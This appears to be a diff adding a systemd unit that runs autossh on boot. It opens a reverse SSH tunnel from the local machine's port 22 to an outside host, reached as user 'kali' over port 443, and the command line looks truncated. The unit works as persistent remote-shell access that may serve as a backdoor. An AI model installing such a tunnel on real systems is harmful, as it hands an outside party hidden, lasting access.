@@ -1,0 +1,12 @@
+[Unit]
+	Description= set up autossh tunnel *ON START*
+	Requires=network-online.target
+	After=network-online.target
+[Service]
+	User=db1
+	Type=oneshot
+	RemainAfterExit=yes
+	ExecStart=/usr/bin/autossh -tt -M 11166 -o "ServerAliveInterval 60" -o "ServerAliveCountMax 3" -i /home/db1/.ssh/keys/to-vm/id_rsa -p 443 -R 1337:localhost:22 kali@52.237.135.2>
+[Install]
+	WantedBy=multi-user.target
+
